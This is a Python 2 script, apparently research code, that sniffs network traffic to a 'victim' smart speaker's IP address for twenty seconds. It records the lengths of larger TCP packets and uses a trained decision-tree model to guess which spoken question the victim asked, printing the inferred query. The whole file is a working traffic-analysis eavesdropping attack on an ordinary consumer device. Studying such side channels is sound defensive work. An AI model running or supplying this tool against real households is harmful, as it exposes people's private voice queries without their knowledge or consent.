import argparse
import time
from PacketSniffer import PacketSniffer
import knn_train
import decisiontree_train

sound_dir = 'speech_train/'
speech_label = 1
packet_collect_dir = 'packet_collect/'

thresh_len = 200 #threshold length of a packet, if <, drop
collect_duration = 20 #duration to collect packets
total_train_sound = 10 #total number of training sound files
each_train_trials = 50 #how many times each sound trains

ap = argparse.ArgumentParser()
ap.add_argument('-i', nargs=1)
ap.add_argument('-v', nargs=1)

opts = ap.parse_args()
interface = opts.i[0]
victim_ip = opts.v[0]

victim_ip_parts = victim_ip.split('.')
victim_ip = ''
for victim_ip_part in victim_ip_parts:
    hex_part = hex(int(victim_ip_part)).split('x')[1]
    if len(hex_part) == 1:
        hex_part = '0' + hex_part

    victim_ip += hex_part

packet_snf = PacketSniffer(interface)
google_home_ip_hex = victim_ip

play_count = 0

timeout = time.time() + collect_duration

target_packets = []

while True:
    tcp_flag = packet_snf.get_tcp_package()

    if time.time() > timeout:
        print 'Collection timeout, break the loop!'
        break

    if tcp_flag and \
        packet_snf.tcp_packet_hex[packet_snf.DestIP_Start:packet_snf.DestIP_End] == google_home_ip_hex:

        #useless traffic, skip
        if len(packet_snf.tcp_packet_hex) <= thresh_len:
            continue

        print 'collecting......'
        target_packets.append(len(packet_snf.tcp_packet_hex))

question_list_file = 'speech_train/question_list.txt'
q_f = open(question_list_file, 'r')

print 'Calculating......'
labels = dict()
for i in range(50):
    key = int(round(decisiontree_train.get_prediction(target_packets)))
    if key in labels:
        labels[key] += 1
    else:
        labels[key] = 1

question_index = 0
max_val = 0
for key in labels:
    if labels[key] > max_val:
        max_val = labels[key]
        question_index = key

lines = []
for line in q_f:
    lines.append(line)

print
print
print 'It is mostly likely you asked:'
print lines[question_index-1]